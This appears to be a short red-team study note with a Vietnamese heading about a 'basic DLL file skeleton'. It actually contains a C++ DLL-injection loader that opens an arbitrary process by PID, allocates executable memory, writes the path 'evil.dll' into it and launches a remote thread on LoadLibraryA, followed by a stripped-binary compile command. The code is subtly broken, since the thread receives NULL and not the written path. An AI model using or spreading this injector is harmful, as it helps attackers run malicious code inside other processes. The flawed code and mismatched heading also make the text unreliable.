## 1. Sườn code của 1 file dll cơ bản

```c++
```

```c++
#include <windows.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <tlhelp32.h>

char dll_file[]= "evil.dll";
unsigned int file_len= sizeof(dll_file)+1;

int main(int argc, char* argv[]){
    HMODULE w_Kernel32= GetModuleHandle("Kernel32");
    VOID* w_LoadLibraryA= GetProcAddress(w_Kernel32, "LoadLibraryA");

    if (atoi(argv[1])==0){
        printf("PID not found \n");
        return -1;
    }

    printf("PID: %i", atoi(argv[1]));
    HANDLE hProcess= OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));

    // allocate empty buffer for remote process
    LPVOID pRemoteMemory = VirtualAllocEx(hProcess, NULL, file_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // write data to that buffer
    WriteProcessMemory(hProcess, pRemoteMemory, dll_file, file_len, NULL);

    // process start new thread
    HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)w_LoadLibraryA, NULL, 0, NULL);

    // close process
    CloseHandle(hProcess);
    return 0;    
}
```

- Compile: `x86_64-w64-mingw32-gcc -O2  dll_inject.cpp  -o dll_inject.exe -I/usr/share/mingw-w64/include/  -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive`


